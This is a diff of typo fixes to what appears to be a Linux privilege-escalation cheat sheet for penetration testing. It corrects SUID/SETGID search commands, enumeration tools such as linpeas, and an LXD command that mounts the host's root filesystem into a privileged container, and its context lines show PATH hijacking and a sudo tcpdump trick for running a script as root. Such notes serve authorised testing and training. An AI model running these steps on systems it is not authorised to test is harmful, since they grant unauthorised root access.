@@ -71,7 +71,7 @@ screen -v
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	
 
 # Find binaries with the SETGID bit set
-find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null	
+find / -user root -perm -2000 -exec ls -ldb {} \; 2>/dev/null	
 
 # find capabilities like SUID manually
 /usr/sbin/getcap -r / 2>/dev/null
@@ -81,7 +81,7 @@ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z roo
 
 # Check the current user's PATH variable contents
 echo $PATH	
-getenv
+env
 
 # Add a . to the beginning of the current user's PATH
 PATH=.:${PATH}	
@@ -110,10 +110,8 @@ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
 #Start a privileged LXD container
 lxc init alpine r00t -c security.privileged=true	
 
-lxc config device add r00t mip a
-
 # Mount the host file system in a container
-ydev disk source=/ path=/mnt/root recursive=true	
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	
 
 # Start the container
 lxc start r00t	
@@ -127,7 +125,7 @@ sudo mount -t nfs 10.129.2.12:/tmp /mnt
 # Created a shared tmux session socket
 tmux -S /shareds new -s debugsess	
 
-# audit system	Perform a system audit with Lynis
+# audit system	Perform a system audit with linpeas
 ./linpeas.sh 
 
 #iptables fw rules
@@ -137,7 +135,7 @@ cat /etc/iptables/rules.v4
 lsmod
 
 # get more info about some module
-/sbin/mdinfo libdata
+/sbin/modinfo libdata
 ```
 
 
@@ -213,7 +211,7 @@ https://github.com/pentestmonkey/unix-privesc-check
 
 ### Linpeas
 
-`./linpeas,sh`
+`./linpeas.sh`
 
 ## Utilities
 
